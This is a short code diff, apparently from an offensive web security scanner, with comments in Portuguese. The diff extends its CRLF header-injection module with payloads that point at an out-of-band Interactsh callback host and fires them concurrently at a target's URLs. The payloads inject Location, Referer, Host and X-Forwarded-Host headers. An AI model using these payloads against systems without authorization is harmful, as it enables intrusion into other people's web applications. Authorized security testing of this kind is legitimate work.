@@ -140,6 +140,22 @@ def run(context: dict):
     outdir = ensure_outdir(target)
     results_file = outdir / "crlf_results.json"
     
+    # Carregar OAST payload (Interactsh) se existir
+    oast_url = ""
+    oast_file = Path("output") / target / "oast_payload.txt"
+    if oast_file.exists():
+        oast_url = oast_file.read_text(errors="ignore").strip()
+        info(f"   [i] Injectando payload OAST automaticamente: {C.YELLOW}{oast_url}{C.END}")
+        
+    local_payloads = CRLF_PAYLOADS.copy()
+    if oast_url:
+        local_payloads.extend([
+            f"%0d%0aLocation:%20http://{oast_url}",
+            f"\\r\\nReferer: http://{oast_url}",
+            f"%0d%0aHost:%20{oast_url}",
+            f"%0d%0aX-Forwarded-Host:%20{oast_url}"
+        ])
+    
     # Carregar URLs
     urls_file = Path("output") / target / "urls" / "urls_200.txt"
     if not urls_file.exists():
@@ -173,7 +189,7 @@ def run(context: dict):
         with ThreadPoolExecutor(max_workers=10) as executor:
             futures = {}
             for url in testable:
-                for payload in CRLF_PAYLOADS:
+                for payload in local_payloads:
                     future = executor.submit(test_crlf, client, url, payload)
                     futures[future] = url
             
